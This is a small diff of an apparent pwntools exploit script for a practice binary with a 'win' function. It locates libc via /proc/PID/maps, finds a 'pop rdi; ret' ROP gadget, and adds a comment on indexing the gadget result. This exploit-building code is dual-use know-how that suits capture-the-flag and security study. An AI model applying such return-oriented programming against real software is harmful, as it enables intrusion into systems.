@@ -22,7 +22,7 @@ log.info(f"libc.address after load them from dynamic runtime: {hex(libc.address)
 
 #  Search ROP gadgets inside libc after loaded from runtime /proc/PID/maps
 rop_libc = ROP(libc)
-pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
+pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]    # without [0] gadget will return the full object (0x9fa....,instruction,... ,more)
 #ret = rop_libc.find_gadget(['ret'])[0]                 # i don't need it now cause i have defualt ret after pop
 
 win = elf.sym["win"]
